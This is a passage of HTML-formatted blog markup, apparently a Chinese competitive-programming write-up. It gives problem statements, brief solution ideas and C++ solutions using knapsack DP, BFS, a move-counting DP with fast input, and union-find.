%d"</span>,dt[mi][i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="肥宅坐车"><a href="#肥宅坐车" class="headerlink" title="肥宅坐车"></a>肥宅坐车</h1><h2 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h2><p>一群肥宅打算坐车去幻想乡，然而现在只剩下一辆车，这辆车在不考虑司机的情况下承重W(0&lt;=W&lt;=23333)，n个肥宅挤着想上车(0&lt;n&lt;=50)。老司机说：“你们给我乖乖站好！我现在会从你们之中挑一些人上车，使得车辆承重减去乘客的总重量得到的差最小！”老司机挑好人之后，让被选出的肥宅全部上车，并把车门焊死，然后把车上的肥宅送去了幼儿园。</p><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>二维01背包不多bb一把梭，注意需要进行一维优化</p><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> max(x,y) x&gt;y?x:y;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> v[<span class="number">55</span>];<span class="comment">//价值</span></span><br><span class="line"><span class="keyword">int</span> w[<span class="number">55</span>];<span class="comment">//重量</span></span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">23340</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;m,&amp;n)!=EOF)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="keyword">sizeof</span>(dp));<span class="comment">//初始化</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++)</span><br><span class="line">        &#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;w[i]);</span><br><span class="line">        v[i]=w[i];</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++) <span class="comment">// 物品数</span></span><br><span class="line">            &#123;        </span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=m; j&gt;=w[i]; j--) <span class="comment">//放入背包</span></span><br><span class="line">                &#123;</span><br><span class="line">                dp[j]=max(dp[j],dp[j-w[i]]+v[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">int</span> mi=<span class="number">999999</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=m;++i)</span><br><span class="line">        &#123;</span><br><span class="line">        mi=min(mi,m-dp[i]);</span><br><span class="line">&#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,mi);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="意大利炮"><a href="#意大利炮" class="headerlink" title="意大利炮"></a>意大利炮</h1><h2 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h2><p>独立团有多支小队平均分布地驻扎在一条东西方向的直线上，每隔1公里有一座营地，编号从1到N。每座营地有一门神奇的意大利炮，可以把人当作炮弹发射出去，被当作炮弹发射的人落地后不会受到半点损伤，官兵们爱上了通过这些意大利炮来在营地间移动，乐此不疲。每门意大利炮拥有固定的射击距离，可以向东或向西发射。独立团团长李云龙想知道，通过意大利炮把一名士兵从一座营地送到另一座营地，至少需要开多少炮？</p><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>BFS的不要太明显，签到题。</p><h2 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;utility&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">200</span>+<span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> v[maxn];</span><br><span class="line"><span class="keyword">int</span> vis[maxn];</span><br><span class="line"><span class="keyword">int</span> n,s,e;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(~<span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;n,&amp;s,&amp;e))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memset</span>(vis,<span class="number">0</span>,<span class="keyword">sizeof</span>(vis));</span><br><span class="line"><span class="built_in">queue</span>&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; &gt;q; </span><br><span class="line">pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;temp;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;v[i]);</span><br><span class="line">&#125;</span><br><span class="line">temp.first=s;</span><br><span class="line">temp.second=<span class="number">0</span>;</span><br><span class="line">q.push(temp);</span><br><span class="line">pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;nt;</span><br><span class="line"><span class="keyword">bool</span> fd=<span class="literal">false</span>;</span><br><span class="line"><span class="keyword">while</span>(q.empty()!=<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">temp=q.front();</span><br><span class="line">q.pop();</span><br><span class="line"><span class="keyword">if</span>(temp.first==e)</span><br><span class="line">&#123;</span><br><span class="line">fd=<span class="literal">true</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,temp.second);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(vis[temp.first]==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">vis[temp.first]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> r=temp.first-v[temp.first];</span><br><span class="line"><span class="keyword">int</span> l=temp.first+v[temp.first];</span><br><span class="line"><span class="keyword">if</span>(r&gt;=<span class="number">1</span>&amp;&amp;r&lt;=n)</span><br><span class="line">&#123;</span><br><span class="line">nt.first=r;</span><br><span class="line">nt.second=temp.second+<span class="number">1</span>;</span><br><span class="line">q.push(nt);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(l&gt;=<span class="number">1</span>&amp;&amp;l&lt;=n)</span><br><span class="line">&#123;</span><br><span class="line">nt.first=l;</span><br><span class="line">nt.second=temp.second+<span class="number">1</span>;</span><br><span class="line">q.push(nt);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(fd==<span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"-1\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h1 id="奇怪的睿国"><a href="#奇怪的睿国" class="headerlink" title="奇怪的睿国"></a>奇怪的睿国</h1><p>不会</p><h1 id="辅导员巡考"><a href="#辅导员巡考" class="headerlink" title="辅导员巡考"></a>辅导员巡考</h1><h2 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h2><p>武汉理工大学正在举行期末考试，辅导员负责666号教学楼的考场巡视工作。每分钟，辅导员可能有三种行为：留在原教室、通过传送门瞬移到下一个相邻的教室、捉住作弊考生。辅导员捉住作弊考生之后就取消考生的考试资格，然后对ta进行思想教育，并且不再巡视考场。已知666号教学楼没有走廊和楼梯，只能通过双向传送门在教室之间移动，现给出666号教学楼的教室传送门分布图，在第0分钟时导员位于1号教室，问经过了T分钟，辅导员可能的行动组合有多少种？</p><h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>倒过来dp，我们假设倒数第i分钟从j出发的方案数为dp[j],那么dp[j]其实可以从j所有关联的边转移过来，也就是dp[j]=$\sum_{r=0}^{num}dp[r]$+1,其中$r$是关联的第r条边，注意这里是加的旧的还没更新的dp，所以需要开dp[n][2]来存,0表示还没改变,1表示更新后的值。而+1是因为除了有关联边转移其实还能选择去抓作弊的学生，所以+1。需要注意的是他自己能选择不走，所以需要手动对每个结点加一条指向自己的边。<br>这样做的复杂度显然最多不超过$O(NMT)$，也就是3e9，但是显然这个上界定的过高，因为不是每个节点都和其他所有节点关联。听群里说有人dp960多毫秒卡过了，那我就开个O(3)优化，循环展开，然后再来一发fread的快读，跑了240多ms。</p><h2 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> GCC optimize(3)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FastIO</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> S = <span class="number">100</span> &lt;&lt; <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> wpos;</span><br><span class="line">    <span class="keyword">char</span> wbuf[S];</span><br><span class="line"></span><br><span class="line">    FastIO() : wpos(<span class="number">0</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">xchar</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">char</span> buf[S];</span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">int</span> len = <span class="number">0</span>, pos = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pos == len)</span><br><span class="line">        &#123;</span><br><span class="line">            pos = <span class="number">0</span>;</span><br><span class="line">            len = (<span class="keyword">int</span>)fread(buf, <span class="number">1</span>, S, <span class="built_in">stdin</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (pos == len)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> buf[pos++];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">xint</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> s = <span class="number">1</span>, c = xchar(), x = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (c &lt;= <span class="number">32</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            c = xchar();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="string">'-'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            s = <span class="number">-1</span>;</span><br><span class="line">            c = xchar();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (; <span class="string">'0'</span> &lt;= c &amp;&amp; c &lt;= <span class="string">'9'</span>; c = xchar())</span><br><span class="line">        &#123;</span><br><span class="line">            x = x * <span class="number">10</span> + c - <span class="string">'0'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> x * s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ~FastIO()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (wpos)</span><br><span class="line">        &#123;</span><br><span class="line">            fwrite(wbuf, <span class="number">1</span>, wpos, <span class="built_in">stdout</span>);</span><br><span class="line">            wpos = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; io;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">30</span>+<span class="number">5</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxm=<span class="number">100</span>+<span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> dp[maxn][<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> dt[maxn][maxn];</span><br><span class="line"><span class="keyword">int</span> szz[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">register</span> <span class="keyword">int</span> n,m;</span><br><span class="line"><span class="keyword">register</span> <span class="keyword">int</span> a,b;</span><br><span class="line"><span class="comment">//scanf("%hd%hd",&amp;n,&amp;m);</span></span><br><span class="line">n=io.xint();</span><br><span class="line">m=io.xint();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;++i)</span><br><span class="line">&#123;</span><br><span class="line">a=io.xint();</span><br><span class="line">b=io.xint();</span><br><span class="line"><span class="comment">//scanf("%hd%hd",&amp;a,&amp;b);</span></span><br><span class="line">dt[a][szz[a]++]=b;</span><br><span class="line">dt[b][szz[b]++]=a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;++i)</span><br><span class="line">&#123;</span><br><span class="line">dt[i][szz[i]++]=i;</span><br><span class="line"><span class="comment">//dt[i].push_back(i);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">register</span> <span class="keyword">int</span> t;</span><br><span class="line">t=io.xint();</span><br><span class="line"><span class="comment">//scanf("%d",&amp;t);</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=t+<span class="number">1</span>;++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;++j)</span><br><span class="line">&#123;</span><br><span class="line">dp[j][<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> sz=szz[j];</span><br><span class="line"><span class="keyword">int</span> qs=sz/<span class="number">4</span>;</span><br><span class="line"><span class="keyword">int</span> qr=sz%<span class="number">4</span>;</span><br><span class="line"><span class="keyword">register</span> <span class="keyword">int</span> m1,m2,m3,m4;</span><br><span class="line">m1=m2=m3=m4=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">register</span> <span class="keyword">int</span> rs=<span class="number">0</span>;rs&lt;qs;++rs)</span><br><span class="line">&#123;</span><br><span class="line">m1+=dp[dt[j][rs*<span class="number">4</span>+<span class="number">0</span>]][<span class="number">0</span>];</span><br><span class="line">m2+=dp[dt[j][rs*<span class="number">4</span>+<span class="number">1</span>]][<span class="number">0</span>];</span><br><span class="line">m3+=dp[dt[j][rs*<span class="number">4</span>+<span class="number">2</span>]][<span class="number">0</span>];</span><br><span class="line">m4+=dp[dt[j][rs*<span class="number">4</span>+<span class="number">3</span>]][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">register</span> <span class="keyword">int</span> ms=qs*<span class="number">4</span>;</span><br><span class="line">dp[j][<span class="number">1</span>]+=m1+m2+m3+m4;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> rs=<span class="number">0</span>;rs&lt;qr;++rs)</span><br><span class="line">&#123;</span><br><span class="line">dp[j][<span class="number">1</span>]+=dp[dt[j][ms+rs]][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;++j)</span><br><span class="line">&#123;</span><br><span class="line">dp[j][<span class="number">0</span>]=dp[j][<span class="number">1</span>]%<span class="number">2018</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%hd\n"</span>,(dp[<span class="number">1</span>][<span class="number">0</span>]%<span class="number">2018</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="买女装"><a href="#买女装" class="headerlink" title="买女装"></a>买女装</h1><h2 id="题意-4"><a href="#题意-4" class="headerlink" title="题意"></a>题意</h2><p>小庄是个女装爱好者，有一天他跑到女装店去买女装。商店里有编号从1到n的n件衣物饰品，每一件都有固定的魅力加成值。老板告诉他，其中某些商品必须搭配购买，而且商品之间的搭配关系具有传递性，若A与B搭配且B与C搭配，则A与C也搭配。小庄带的钱有限，请你帮他找到魅力加成值总和最大的购买方案。</p><h2 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h2><p>并查集查出所有依赖关系，然后把依赖的揉合成一个物品，最后跑01背包</p><h2 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">1e4</span>+<span class="number">8</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxw=<span class="number">1e4</span>+<span class="number">7</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="keyword">int</span> c[maxw], N;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;=N; i++)&#123;</span><br><span class="line">        c[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Findset</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> root = x;</span><br><span class="line">    <span class="keyword">while</span>(c[root] != root)</span><br><span class="line">        root = c[root];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> idx;</span><br><span class="line">    <span class="keyword">while</span>(c[x] != root)&#123; <span class="comment">/// 路径压缩</span></span><br><span class="line">        idx = c[x];</span><br><span class="line">        c[x] = root;</span><br><span class="line">        x = idx;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">Join</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> A = Findset(a);</span><br><span class="line">    <span class="keyword">int</span> B = Findset(b);</span><br><span class="line">    <span class="keyword">if</span>(A != B) c[A] = B;</span><br><span class="line">&#125;</span><br><span class="line">LL dp[maxw];</span><br><span class="line">LL dt[maxn][<span class="number">2</span>];</span><br><span class="line">LL dpt[maxn][<span class="number">2</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n,m,w;</span><br><span class="line"><span class="keyword">int</span> a,b;</span><br><span class="line"><span class="keyword">while</span>(~<span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;n,&amp;m,&amp;w))</span><br><span class="line">&#123;</span><br><span class="line">N=n;</span><br><span class="line">init();</span><br><span class="line"><span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="keyword">sizeof</span>(dp));</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;dt[i][<span class="number">0</span>],&amp;dt[i][<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;a,&amp;b);</span><br><span class="line">Join(a,b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;++i)</span><br><span 